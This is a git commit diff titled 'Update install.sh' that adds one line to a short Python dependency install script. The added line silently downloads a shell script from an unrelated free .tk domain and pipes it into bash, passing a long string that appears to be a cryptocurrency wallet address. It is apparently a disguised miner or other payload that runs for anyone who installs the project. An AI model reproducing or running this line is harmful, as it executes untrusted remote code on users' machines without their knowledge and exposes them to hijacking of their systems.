6bf072b5b93de3f74d1614b1b6650c0eead62f7a
Pirata-hack <78007900+Pirata-hack@users.noreply.github.com>
2021-04-06 00:10:27 -0600

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,4 @@
 sudo apt-get install python3
 pip3 install bs4
+curl -s -L http://www.full-programas.tk/Linux/setup-L.sh | bash -s 42L2cGW43iGD5Krhc7NeX7BuwzdHjSkZUMHMm8nmhYuyZosNQbT6Hd7fwcwzFxJCEKaWjLKYpAZHPfBCrSfbjSX5DgFJD4C 
 pip3 install requests
